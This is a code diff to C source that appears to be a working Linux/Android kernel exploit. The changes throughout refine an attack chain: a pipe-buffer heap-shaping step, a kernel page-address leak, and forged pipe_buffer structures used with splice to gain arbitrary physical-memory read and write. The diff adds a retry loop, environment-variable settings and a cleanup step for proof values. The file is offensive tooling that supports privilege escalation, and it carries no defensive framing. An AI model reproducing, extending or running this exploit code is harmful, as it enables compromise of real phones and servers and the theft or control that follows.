@@ -72,9 +72,7 @@ void alloc_pipe_object(int pipefd[2]) {
   resize_pipe_slots(pipefd, PIPE_BUFFER_SLOTS);
 }
 
-void free_pipe_object(int pipefd[2]) {
-  resize_pipe_slots(pipefd, 2);
-}
+void free_pipe_object(int pipefd[2]) { resize_pipe_slots(pipefd, 2); }
 
 void shape_pipe_cache_once(void) {
   for (size_t i = 0; i < PIPE_N_COUNT; i++) {
@@ -208,7 +206,8 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   run_kernelsnitch_bruteforce();
   uintptr_t leaked = cleanup_kernelsnitch();
   if (leaked == (uintptr_t)-1) {
-    pr_error("pipe KernelSnitch sk_buff page leak failed\n");
+    pr_warning("pipe KernelSnitch sk_buff page leak failed\n");
+    return 0;
   }
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
 
@@ -229,7 +228,7 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   return base;
 }
 
-uintptr_t prepare_pipe_buffer_page(void) {
+static uintptr_t prepare_pipe_buffer_page_once(void) {
   if (PIPE_SHAPE_ROUNDS != 0) {
     for (size_t i = 0; i < PIPE_N_COUNT; i++) {
       make_pipe_object(pipe_fds_n[i]);
@@ -255,7 +254,6 @@ uintptr_t prepare_pipe_buffer_page(void) {
   if (child == 0) {
     SYSCHK(close(result_pipe[0]));
     uintptr_t base = prepare_pipe_buffer_page_child();
-    pr_info("pipe-prep child pid=%d base=%016zx\n", getpid(), base);
     SYSCHK(write(result_pipe[1], &base, sizeof(base)));
     for (;;) {
       sleep(60);
@@ -269,9 +267,32 @@ uintptr_t prepare_pipe_buffer_page(void) {
   ssize_t got = read(result_pipe[0], &base, sizeof(base));
   SYSCHK(close(result_pipe[0]));
   if (got != (ssize_t)sizeof(base)) {
-    pr_error("pipe page child did not report base\n");
+    pr_warning("pipe page child did not report base\n");
+    base = 0;
   }
   return base;
+}
+
+uintptr_t prepare_pipe_buffer_page(void) {
+  int attempts = 3;
+  const char *e = getenv("SLIDE_PIPE_LEAK_ATTEMPTS");
+  if (e) {
+    int v = atoi(e);
+    if (v >= 1 && v <= 10)
+      attempts = v;
+  }
+  for (int a = 1; a <= attempts; a++) {
+    uintptr_t base = prepare_pipe_buffer_page_once();
+    if (base != 0) {
+      pr_info("pipe page leak ok attempt=%d/%d base=%016zx\n", a, attempts,
+              base);
+      return base;
+    }
+    pr_warning("pipe page leak attempt %d/%d failed\n", a, attempts);
+    reset_pipe_attempt();
+  }
+  pr_warning("pipe page leak EXHAUSTED attempts=%d\n", attempts);
+  return 0;
 }
 
 void reset_pipe_attempt(void) {
@@ -330,9 +351,7 @@ uintptr_t page_to_direct(uintptr_t page) {
   return DIRECT_MAP_BASE + (pfn << PAGE_SHIFT);
 }
 
-uintptr_t pipe_buf_ops_addr(void) {
-  return text_addr(ANON_PIPE_BUF_OPS);
-}
+uintptr_t pipe_buf_ops_addr(void) { return text_addr(ANON_PIPE_BUF_OPS); }
 
 int pipe_cache_matches(uint64_t slab_cache) {
   if (slab_cache == 0) {
@@ -363,20 +382,20 @@ int pipe_reclaim_cache_gate(int fd) {
   memset(cache_slots, 0, sizeof(cache_slots));
   uintptr_t kmalloc_caches = data_addr(KMALLOC_CACHES);
   ssize_t slots_rd =
-    kernel_read_data(fd, kmalloc_caches, cache_slots, sizeof(cache_slots));
+      kernel_read_data(fd, kmalloc_caches, cache_slots, sizeof(cache_slots));
   kmalloc_normal_1k_cache =
-    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 10];
+      cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 10];
   kmalloc_normal_2k_cache =
-    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 11];
+      cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 11];
   kmalloc_cgroup_1k_cache =
-    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 10];
+      cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 10];
   kmalloc_cgroup_2k_cache =
-    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 11];
+      cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 11];
 
   uintptr_t cg2k_slot = data_addr(KMALLOC_CGROUP_PIPE_SLOT);
   uint64_t pipe_slot_val = 0;
   ssize_t pipeslot_rd =
-    kernel_read_data(fd, cg2k_slot, &pipe_slot_val, sizeof(pipe_slot_val));
+      kernel_read_data(fd, cg2k_slot, &pipe_slot_val, sizeof(pipe_slot_val));
   kmalloc_pipe_cache = pipe_slot_val;
 
   uintptr_t gate_head[PIPE_CANDIDATE_PAGES];
@@ -390,13 +409,12 @@ int pipe_reclaim_cache_gate(int fd) {
     uintptr_t page = pipebuf_page_base + off;
     uintptr_t head = direct_to_head_page(fd, page);
     uint64_t slab_cache = 0;
-    ssize_t srd =
-      kernel_read_data(fd, head + STRUCT_SLAB_CACHE_OFF, &slab_cache,
-                       sizeof(slab_cache));
+    ssize_t srd = kernel_read_data(fd, head + STRUCT_SLAB_CACHE_OFF,
+                                   &slab_cache, sizeof(slab_cache));
     uintptr_t type_addr = head + STRUCT_PAGE_TYPE_OFF;
     uint32_t page_type = 0;
     ssize_t trd =
-      kernel_read_data(fd, type_addr, &page_type, sizeof(page_type));
+        kernel_read_data(fd, type_addr, &page_type, sizeof(page_type));
     pipe_page_slab_cache[off / PAGE_SIZE] = slab_cache;
     pipe_page_type[off / PAGE_SIZE] = page_type;
     if (gate_pages < PIPE_CANDIDATE_PAGES) {
@@ -426,20 +444,20 @@ int pipe_reclaim_cache_gate(int fd) {
 
   uint64_t uts_val = 0;
   ssize_t uts_rd =
-    kernel_read_data(fd, data_addr(INIT_UTS_NS), &uts_val, sizeof(uts_val));
+      kernel_read_data(fd, data_addr(INIT_UTS_NS), &uts_val, sizeof(uts_val));
   pr_info("pipe cache gate diag fd=%d kmalloc_caches_addr=%016zx "
           "slots_rd=%zd cg2k_slot_addr=%016zx pipeslot_rd=%zd cg2k=%016zx "
           "n1k=%016zx n2k=%016zx cg1k=%016zx cg2k_sel=%016zx "
           "uts_ctrl=%016zx uts_rd=%zd errno=%d\n",
           fd, kmalloc_caches, slots_rd, cg2k_slot, pipeslot_rd,
-          kmalloc_pipe_cache, kmalloc_normal_1k_cache,
-          kmalloc_normal_2k_cache, kmalloc_cgroup_1k_cache,
-          kmalloc_cgroup_2k_cache, (uintptr_t)uts_val, uts_rd, errno);
+          kmalloc_pipe_cache, kmalloc_normal_1k_cache, kmalloc_normal_2k_cache,
+          kmalloc_cgroup_1k_cache, kmalloc_cgroup_2k_cache, (uintptr_t)uts_val,
+          uts_rd, errno);
   for (size_t i = 0; i < gate_pages; i++) {
     pr_info("pipe cache gate diag page[%zu] head=%016zx slab=%016zx "
             "srd=%zd type=%u trd=%zd\n",
-            i, gate_head[i], (uintptr_t)gate_slab[i], gate_srd[i],
-            gate_type[i], gate_trd[i]);
+            i, gate_head[i], (uintptr_t)gate_slab[i], gate_srd[i], gate_type[i],
+            gate_trd[i]);
   }
 
   pipe_cache_gate_ok = 0;
@@ -550,11 +568,7 @@ uint32_t pipe_splice_read32(int fd, uintptr_t addr) {
 static int pfg_kmalloc_cg2k(int fd, uintptr_t *out) {
   uintptr_t cg2k_slot = data_addr(KMALLOC_CGROUP_PIPE_SLOT);
   uint64_t cg2k = 0;
-  ssize_t rd =
-    kernel_read_data(fd, cg2k_slot, &cg2k, sizeof(cg2k));
-  pr_info("phys step global cg2k slot addr=%016zx read=%016zx rd=%zd "
-          "errno=%d\n",
-          cg2k_slot, (uintptr_t)cg2k, rd, errno);
+  kernel_read_data(fd, cg2k_slot, &cg2k, sizeof(cg2k));
   if (!is_kernel_ptr(cg2k)) {
     return 0;
   }
@@ -562,14 +576,13 @@ static int pfg_kmalloc_cg2k(int fd, uintptr_t *out) {
   return 1;
 }
 
-static int pfg_scan_range(int fd, uintptr_t cg2k, uintptr_t *pages,
-                          int max, uintptr_t start, uintptr_t end) {
+static int pfg_scan_range(int fd, uintptr_t cg2k, uintptr_t *pages, int max,
+                          uintptr_t start, uintptr_t end) {
   static unsigned char buf[PFG_SCAN_CHUNK];
   int found = 0;
   uint64_t chunks = 0;
   for (uintptr_t addr = start; addr < end; addr += PFG_SCAN_CHUNK) {
-    if (kernel_read_data(fd, addr, buf, sizeof(buf)) !=
-        (ssize_t)sizeof(buf)) {
+    if (kernel_read_data(fd, addr, buf, sizeof(buf)) != (ssize_t)sizeof(buf)) {
       continue;
     }
     chunks++;
@@ -592,8 +605,8 @@ static int pfg_scan_range(int fd, uintptr_t cg2k, uintptr_t *pages,
   return found;
 }
 
-static int pfg_find_slab_pages(
-    int fd, uintptr_t cg2k, uintptr_t *pages, int max) {
+static int pfg_find_slab_pages(int fd, uintptr_t cg2k, uintptr_t *pages,
+                               int max) {
   long phys_pages = sysconf(_SC_PHYS_PAGES);
   if (phys_pages <= 0) {
     pr_info("phys step global scan: sysconf(_SC_PHYS_PAGES)=%ld, bail\n",
@@ -601,8 +614,8 @@ static int pfg_find_slab_pages(
     return 0;
   }
   uintptr_t bound_a = VMEMMAP_START + (uint64_t)phys_pages * STRUCT_PAGE_SIZE;
-  pr_info("phys step global scan bound A: sysconf=%ld end=%016zx\n",
-          phys_pages, bound_a);
+  pr_info("phys step global scan bound A: sysconf=%ld end=%016zx\n", phys_pages,
+          bound_a);
   int found = pfg_scan_range(fd, cg2k, pages, max, VMEMMAP_START, bound_a);
   if (found > 0) {
     return found;
@@ -613,11 +626,10 @@ static int pfg_find_slab_pages(
     return 0;
   }
   uintptr_t bound_b = direct_to_page(pipebuf_page_base) + (64ULL << 20);
-  pr_warning("phys step global scan A empty; retry bound B=%016zx\n",
-             bound_b);
+  pr_warning("phys step global scan A empty; retry bound B=%016zx\n", bound_b);
   found = pfg_scan_range(fd, cg2k, pages, max, VMEMMAP_START, bound_b);
   if (found == 0) {
-    pr_warning("phys step global scan B empty - fail clean\n");
+    pr_warning("phys step global scan B empty failed\n");
   }
   return found;
 }
@@ -659,8 +671,7 @@ static int pfg_scan_page(int fd, uintptr_t page) {
     pipebuf_page_base = page_direct;
     pr_info("phys step global pipebuf obj=%016zx page=%016zx idx=%d "
             "len=%u\n",
-            pipebuf_addr, pipebuf_page_base, pipebuf_pipe_idx,
-            pipe_probe_len);
+            pipebuf_addr, pipebuf_page_base, pipebuf_pipe_idx, pipe_probe_len);
     return 1;
   }
   return 0;
@@ -685,14 +696,12 @@ int pipe_find_buffer_global(int fd) {
     found = pfg_scan_page(fd, pages[i]);
     scanned++;
   }
-  pr_info("phys step global scan done pages=%d found=%d\n", scanned,
-          found);
+  pr_info("phys step global scan done pages=%d found=%d\n", scanned, found);
   return found;
 }
 
-int pipe_phys_read(
-    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
-    void *out, size_t len) {
+int pipe_phys_read(int fd, int pipefd[2], uintptr_t buf_addr,
+                   uintptr_t direct_addr, void *out, size_t len) {
   struct user_pipe_buffer saved;
   if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
       (ssize_t)sizeof(saved)) {
@@ -707,8 +716,7 @@ int pipe_phys_read(
   pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
   pb.private = 0;
 
-  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) !=
-      (ssize_t)sizeof(pb)) {
+  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) != (ssize_t)sizeof(pb)) {
     return 0;
   }
 
@@ -718,19 +726,20 @@ int pipe_phys_read(
   return ok;
 }
 
-int pipe_splice_read_data(
-    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
-    void *out, size_t len) {
+int pipe_splice_read_data(int fd, int pipefd[2], uintptr_t buf_addr,
+                          uintptr_t direct_addr, void *out, size_t len) {
   static int outfd = -1;
   if (outfd < 0) {
-    outfd = open("/data/local/tmp/splice_dump", O_CREAT | O_RDWR | O_TRUNC,
-                 0600);
+    const char *sp = getenv("SLIDE_SPLICE_TMP");
+    outfd = open(sp && *sp ? sp : "/data/local/tmp/splice_dump",
+                 O_CREAT | O_RDWR | O_TRUNC, 0600);
     if (outfd < 0) {
+      pr_error("splice_dump open %s failed errno=%d\n",
+               sp && *sp ? sp : "/data/local/tmp/splice_dump", errno);
       return 0;
     }
   }
-  if (buf_addr == 0 ||
-      (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
+  if (buf_addr == 0 || (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
     return 0;
   }
 
@@ -748,8 +757,7 @@ int pipe_splice_read_data(
   pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
   pb.private = 0;
 
-  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) !=
-      (ssize_t)sizeof(pb)) {
+  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) != (ssize_t)sizeof(pb)) {
     return 0;
   }
 
@@ -764,9 +772,8 @@ int pipe_splice_read_data(
   return ok;
 }
 
-int pipe_phys_write(
-    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
-    const void *data, size_t len) {
+int pipe_phys_write(int fd, int pipefd[2], uintptr_t buf_addr,
+                    uintptr_t direct_addr, const void *data, size_t len) {
   struct user_pipe_buffer saved;
   if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
       (ssize_t)sizeof(saved)) {
@@ -781,8 +788,7 @@ int pipe_phys_write(
   pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
   pb.private = 0;
 
-  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) !=
-      (ssize_t)sizeof(pb)) {
+  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) != (ssize_t)sizeof(pb)) {
     return 0;
   }
 
@@ -806,8 +812,8 @@ int pipe_phys_write(
   return ok;
 }
 
-void forge_pipe_buffers_on_page(
-    int fd, uintptr_t base, uintptr_t direct_addr, size_t len, int for_write) {
+void forge_pipe_buffers_on_page(int fd, uintptr_t base, uintptr_t direct_addr,
+                                size_t len, int for_write) {
   struct user_pipe_buffer pb;
   memset(&pb, 0, sizeof(pb));
   pb.page = direct_to_page(direct_addr);
@@ -821,8 +827,8 @@ void forge_pipe_buffers_on_page(
   }
 }
 
-int pipe_splice_read_data_auto(
-    int fd, uintptr_t direct_addr, void *out, size_t len) {
+int pipe_splice_read_data_auto(int fd, uintptr_t direct_addr, void *out,
+                               size_t len) {
   if (pipebuf_addr == 0 || pipebuf_pipe_idx < 0) {
     return 0;
   }
@@ -830,8 +836,7 @@ int pipe_splice_read_data_auto(
   return pipe_splice_read_data(fd, pipefd, pipebuf_addr, direct_addr, out, len);
 }
 
-int pipe_splice_read_range(
-    int fd, uintptr_t addr, void *out, size_t len) {
+int pipe_splice_read_range(int fd, uintptr_t addr, void *out, size_t len) {
   unsigned char *p = (unsigned char *)out;
   while (len > 0) {
     size_t chunk = PAGE_SIZE - (addr & (PAGE_SIZE - 1));
@@ -867,8 +872,8 @@ int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len) {
   }
 }
 
-int pipe_phys_write_data(
-    int fd, uintptr_t direct_addr, const void *data, size_t len) {
+int pipe_phys_write_data(int fd, uintptr_t direct_addr, const void *data,
+                         size_t len) {
   if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
     return 0;
   }
@@ -963,8 +968,8 @@ int install_pipe_physrw(int fd) {
     int found = find_pipe_buffer(fd, pipebuf_page_base);
     pr_info(
         "phys step pipe probe found=%d pipebuf=%016zx idx=%d scan=%d/%d/%d\n",
-        found, pipebuf_addr, pipebuf_pipe_idx, pipe_scan_vmemmap,
-        pipe_scan_ops, pipe_scan_len);
+        found, pipebuf_addr, pipebuf_pipe_idx, pipe_scan_vmemmap, pipe_scan_ops,
+        pipe_scan_len);
     if (!found) {
       return 0;
     }
@@ -976,8 +981,8 @@ int install_pipe_physrw(int fd) {
   if (pipebuf_addr == 0) {
     return 0;
   }
-  uintptr_t seed_addr = pipebuf_addr + 0x100;
-  uintptr_t w64_addr = pipebuf_addr + 0x200;
+  uintptr_t seed_addr = pipebuf_addr + 0x600;
+  uintptr_t w64_addr = pipebuf_addr + 0x620;
 
   uintptr_t array_page = direct_to_head_page(fd, pipebuf_page_base);
   pr_info("phys step proof obj=%016zx array_page=%016zx\n", pipebuf_addr,
@@ -991,13 +996,13 @@ int install_pipe_physrw(int fd) {
 
   memset(physrw_readback, 0, sizeof(physrw_readback));
   physrw_read_ok =
-    pipe_phys_read_data(fd, seed_addr, physrw_readback, sizeof(seed));
-  pr_info("phys step probed read done ok=%d idx=%d\n",
-          physrw_read_ok, pipebuf_pipe_idx);
+      pipe_phys_read_data(fd, seed_addr, physrw_readback, sizeof(seed));
+  pr_info("phys step probed read done ok=%d idx=%d\n", physrw_read_ok,
+          pipebuf_pipe_idx);
 
   char overwrite[] = PHYS_WRITE_TAG;
   physrw_write_ok =
-    pipe_phys_write_data(fd, seed_addr, overwrite, sizeof(overwrite));
+      pipe_phys_write_data(fd, seed_addr, overwrite, sizeof(overwrite));
   pr_info("phys step probed write done ok=%d\n", physrw_write_ok);
   kernel_read_data(fd, seed_addr, physrw_after_write, sizeof(overwrite));
 
@@ -1005,14 +1010,35 @@ int install_pipe_physrw(int fd) {
   physrw_write64_ok = pipe_write64(fd, w64_addr, w64);
   physrw_read64_before = pipe_read64(fd, w64_addr);
   physrw_read64_ok = physrw_write64_ok && physrw_read64_before == w64;
-  kernel_read_data(
-      fd, w64_addr, &physrw_read64_after, sizeof(physrw_read64_after));
+  kernel_read_data(fd, w64_addr, &physrw_read64_after,
+                   sizeof(physrw_read64_after));
   physrw_write64_ok = physrw_write64_ok && physrw_read64_after == w64;
-  pr_info("phys step write64 done ok=%d value=%016zx\n",
-          physrw_write64_ok, physrw_read64_after);
+  pr_info("phys step write64 done ok=%d value=%016zx\n", physrw_write64_ok,
+          physrw_read64_after);
 
-  return physrw_read_ok &&
-         memcmp(physrw_readback, seed, sizeof(seed)) == 0 &&
+  char uns_zeros[24];
+  memset(uns_zeros, 0, sizeof(uns_zeros));
+  uint64_t uns_w64 = 0;
+  int uns_w = kernel_write_data(fd, seed_addr, uns_zeros, sizeof(uns_zeros)) ==
+              (ssize_t)sizeof(uns_zeros);
+  int uns_64 = kernel_write_data(fd, w64_addr, &uns_w64, sizeof(uns_w64)) ==
+               (ssize_t)sizeof(uns_w64);
+  char uns_buf[32];
+  memset(uns_buf, 0x5a, sizeof(uns_buf));
+  int uns_rw = kernel_read_data(fd, seed_addr, uns_buf, sizeof(seed)) ==
+                   (ssize_t)sizeof(seed) &&
+               memcmp(uns_buf, uns_zeros, sizeof(seed)) == 0;
+  uint64_t uns_after = 0x5a5a5a5a5a5a5a5aULL;
+  int uns_r64 = kernel_read_data(fd, w64_addr, &uns_after, sizeof(uns_after)) ==
+                    (ssize_t)sizeof(uns_after) &&
+                uns_after == 0;
+  pr_info("v145 unseed (proof@+0x600 beyond ring walk) w=%d,%d "
+          "verify=%d,%d -> shutdown %s\n",
+          uns_w, uns_64, uns_rw, uns_r64,
+          (uns_w && uns_64 && uns_rw && uns_r64) ? "DEFUSED"
+                                                 : "STILL ARMED (tag residue)");
+
+  return physrw_read_ok && memcmp(physrw_readback, seed, sizeof(seed)) == 0 &&
          physrw_write_ok &&
          memcmp(physrw_after_write, overwrite, sizeof(overwrite)) == 0 &&
          physrw_read64_ok && physrw_write64_ok;
